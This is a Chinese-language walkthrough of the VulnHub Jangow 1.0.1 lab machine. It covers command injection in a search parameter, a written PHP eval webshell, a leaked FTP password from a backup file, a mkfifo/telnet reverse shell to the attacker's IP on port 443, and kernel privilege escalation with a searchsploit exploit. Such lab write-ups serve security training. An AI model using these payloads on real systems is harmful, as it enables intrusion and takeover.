jangow-101754

环境信息

靶机地址：https://www.vulnhub.com/entry/jangow-101,754/

kali攻击机：192.168.56.101

靶机：192.168.56.118

渗透测试

主机发现

netdiscover -r 192.168.56.0/24

发现主机192.168.56.118

服务发现

nmap -A 192.168.56.118

发现主机开放21和80端口

服务验证

21端口

21端口为ftp服务，尝试使用匿名用户登陆

ftp 192.168.56.118
用户名：anonymous
密码空

无法使用匿名用户登陆

80端口

访问http://192.168.56.118

发现为目录索引页面，点击进入site目录

对该页面进行网页源代码查看，未发现有效信息。

点击右上角的Buscar功能，跳转到另外一个页面

该页面有一个buscar参数，需要传入值，尝试输入whoami值提交

发现会显出命令执行的内容，该处存在命令执行漏洞

写入webshell

该处存在命令执行漏洞，象到两种方式：一、下载远程webshell文件。 二、执行反弹shell命令。尝试了该两种方式发现均不行，服务器不能与外网通信，想到服务器可能设置了防火墙策略。于是转为写入一句话木马

url编码前：（需要将$符号转义）
echo "<?php @eval(\\$_POST['shell']); ?>" >>shell.php
url编码后：
echo+%22%3C%3Fphp+%40eval(%5C%24_POST%5B'shell'%5D)%3B+%3F%3E%22+%3E%3Eshell.php

执行ls命令，发现成功写入webshell

使用蚁剑连接

成功连接上webshell

信息搜集

查看系统上存在哪些普通用户

cat /etc/passwd |grep 100

发现存在jangow01用户

接着对网站目录进行查看，分析存在的敏感文件

/var/www/html/site/wordpress/config.php存在用户名信息，但是系统上无该desafio02用户

继续查找，在/var/www/html目录下发现存在.backup文件，查看该文件，为jangow01用户密码信息

尝试使用该用户密码信息登陆ftp

ftp 192.168.56.118

成功登陆ftp，下一步尝试登陆到jangow01用户，由于执行su命令需要在终端上执行，下一步进行反弹shell获取终端

反弹shell

由于靶机服务器上大概率开启了防火墙端口过滤，暂不知道什么端口可以出网，使用以下方式探寻靶机什么端口可以出网

kali攻击机开启wireshark监听192.168.56.101IP对应的网卡，过滤IP地址来自于192.168.56.118地址的流量

nc -zvn -w1 192.168.56.101 1-500

发现kali机接收到靶机服务器的443端口的外发请求，

在kali机上开启443端口监听

nc -lvp 443

靶机上执行以下命令

rm -rf /tmp/f; mkfifo /tmp/f && telnet 192.168.56.101 443 0</tmp/f | /bin/sh 1>/tmp/f

成功反弹shell，切换到交互式shell

python3 -c "import pty;pty.spawn('/bin/bash')"

获取到第一个flag

权限提升

查看靶机系统内核

uname -r
cat /etc/os-release

使用kali查看可利用漏洞

searchsploit ubuntu 4.4.0


searchsploit -m linux/local/45010.c

使用ftp将45010.c上传到靶机上

ftp 192.168.56.118
jangow01
abygurl69

cd /tmp
put 45010.c

编译exp

gcc 45010.c -o get-root

成功获取root权限

技术总结

1、靶机的出端口被防火墙过滤，可通过nc端口扫描来发现哪些端口没有被过过滤

nc -zvn -w1 192.168.56.101 1-500

2、webshell的shell不是来自终端，无法执行一些命令，如su等，可通过反弹shell来获取来自终端的shell

3、写一句话木马，其中的特殊字符需要进行转义

4、查看当前用户使用的shell

echo $SHELL
echo $0
cat /etc/passwd |grep 用户名
